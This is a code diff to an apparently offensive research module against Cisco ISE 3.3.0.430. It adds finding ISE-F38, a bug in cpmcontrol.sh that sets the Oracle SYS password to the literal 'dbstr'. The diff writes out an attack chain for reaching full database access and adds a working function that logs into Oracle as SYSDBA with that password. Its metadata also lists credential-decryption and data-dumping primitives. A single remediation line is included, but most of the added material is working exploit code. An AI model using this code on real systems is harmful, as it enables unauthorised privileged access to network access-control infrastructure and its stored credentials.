@@ -53,6 +53,7 @@ ISE-F34: LUKS sec_confleak partition key exposed via key_manager decrypt oracle 
 ISE-F35: AES-128 KEK stored in plaintext in db.properties alongside KEK-encrypted credentials [HIGH]
 ISE-F36: CTA adapter hardcoded AES-CBC IV ISE_AES_TCNAC_VA + PBKDF2 from MongoDB UUIDs — decrypt TCNAC credentials [HIGH]
 ISE-F37: Redis profiler database on localhost:6379 — no requirepass, no TLS; stores ISE endpoint/profiler data [MEDIUM]
+ISE-F38: resetSystemPasswds() bug — orapwd password=dbstr (missing $) sets Oracle SYS to literal "dbstr" on wallet failure [HIGH]
 
 === ISE-F1: key_manager UNIX socket — unauthenticated decryption oracle ===
 
@@ -3096,9 +3097,70 @@ def dump_redis_profiler_keys(host: str = REDIS_HOST, port: int = REDIS_PORT,
         return None
 
 
+# ---------------------------------------------------------------------------
+# ISE-F38: resetSystemPasswds() bug — Oracle SYS password set to literal "dbstr"
+# ---------------------------------------------------------------------------
+#
+# Source: /opt/CSCOcpm/bin/cpmcontrol.sh:322
+#
+# The resetSystemPasswds() function recovers when the Oracle system10 wallet
+# connection fails. On line 322:
+#
+#   dbstr=`/opt/CSCOcpm/bin/getdbpw.sh PAP_ADMIN_PWD`
+#   su - oracle -c "orapwd file=$ORACLE_HOME/dbs/orapwcpm10 password=dbstr ..."
+#                                                            ^^^^^^^^
+#   Bug: missing $ — sets Oracle SYS password to literal "dbstr", not $dbstr.
+#
+# Trigger conditions (any cause the recovery path to run):
+#   - Oracle DB crash or OOM event during ISE startup
+#   - Wallet initialization delay (race between cpmcontrol and wallet ready)
+#   - Administrative ISE reset or recovery operation
+#
+# After trigger: Oracle SYS password = "dbstr" (known hardcoded string)
+# An attacker aware of this bug can connect as sys/dbstr@localhost:1521 as sysdba.
+#
+# Compare: correct implementations in disablesys() and enablesys() both use
+# password=$dbstr (with $). Only resetSystemPasswds() has the bug.
+#
+# Chain: trigger Oracle wallet failure → wait for resetSystemPasswds() to run
+#        → connect as sys/dbstr@localhost:1521/cpm10 as sysdba → full DB access
+#
+# Remediation: fix line 322: password=$dbstr (add $); validate with shellcheck.
+
+ORACLE_F38_PASSWORD    = "dbstr"           # literal string set as Oracle SYS password on wallet failure
+ORACLE_SID             = "cpm10"
+ORACLE_PORT            = 1521
+ORACLE_SYSDBA_USER     = "sys"
+
+
+def check_oracle_wallet_failure_password(host: str = "localhost",
+                                          port: int = ORACLE_PORT,
+                                          sid: str = ORACLE_SID) -> Optional[dict]:
+    """
+    ISE-F38: Probe Oracle with SYS password = "dbstr" (set by resetSystemPasswds() bug).
+
+    Requires cx_Oracle or oracledb Python package.
+    Returns {"connected": True, "version": <ver>} or None on failure.
+    """
+    try:
+        import importlib
+        cx = importlib.import_module("cx_Oracle") if importlib.util.find_spec("cx_Oracle") else \
+             importlib.import_module("oracledb")
+        dsn = cx.makedsn(host, port, sid=sid)
+        conn = cx.connect(user=ORACLE_SYSDBA_USER, password=ORACLE_F38_PASSWORD,
+                          dsn=dsn, mode=cx.SYSDBA)
+        cursor = conn.cursor()
+        cursor.execute("SELECT * FROM v$version WHERE ROWNUM=1")
+        version = cursor.fetchone()
+        conn.close()
+        return {"connected": True, "version": version[0] if version else "unknown"}
+    except Exception:
+        return None
+
+
 MODULE_META = {
     "name": "cisco_ise_re",
-    "version": "1.16.0",
+    "version": "1.17.0",
     "target": "Cisco ISE 3.3.0.430",
     "findings": [
         "ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5",
@@ -3107,12 +3169,12 @@ MODULE_META = {
         "ISE-F16", "ISE-F17", "ISE-F18", "ISE-F19",
         "ISE-F20", "ISE-F21", "ISE-F22", "ISE-F23", "ISE-F24", "ISE-F25",
         "ISE-F26", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F30",
-        "ISE-F31", "ISE-F32", "ISE-F33", "ISE-F34", "ISE-F35", "ISE-F36", "ISE-F37",
+        "ISE-F31", "ISE-F32", "ISE-F33", "ISE-F34", "ISE-F35", "ISE-F36", "ISE-F37", "ISE-F38",
     ],
     "critical": ["ISE-F1", "ISE-F2", "ISE-F6", "ISE-F11", "ISE-F12", "ISE-F16", "ISE-F20",
                  "ISE-F26", "ISE-F31", "ISE-F34"],
     "high": ["ISE-F3", "ISE-F7", "ISE-F9", "ISE-F10", "ISE-F13", "ISE-F15", "ISE-F18",
-             "ISE-F19", "ISE-F23", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F32", "ISE-F35", "ISE-F36"],
+             "ISE-F19", "ISE-F23", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F32", "ISE-F35", "ISE-F36", "ISE-F38"],
     "medium": ["ISE-F5", "ISE-F8", "ISE-F14", "ISE-F21", "ISE-F22", "ISE-F24",
                "ISE-F30", "ISE-F33", "ISE-F37"],
     "low": ["ISE-F4", "ISE-F17", "ISE-F25"],
@@ -3168,6 +3230,10 @@ MODULE_META = {
         "ise_f37_redis_auth": None,
         "ise_f37_redis_dbfile": "profiler_local.rdb",
         "ise_f37_redis_data": "ISE endpoint profiler data (device type, OS, NAC state)",
+        "ise_f38_oracle_password_on_wallet_failure": "dbstr",
+        "ise_f38_trigger": "resetSystemPasswds() when system10 wallet connection fails",
+        "ise_f38_script": "/opt/CSCOcpm/bin/cpmcontrol.sh:322",
+        "ise_f38_bug": "orapwd password=dbstr (missing $) instead of password=$dbstr",
     },
     "primitives": [
         "decrypt_legacy_ise_db_password",
@@ -3225,5 +3291,6 @@ MODULE_META = {
         "extract_cta_credentials_from_mongodb",
         "probe_redis_profiler",
         "dump_redis_profiler_keys",
+        "check_oracle_wallet_failure_password",
     ],
 }
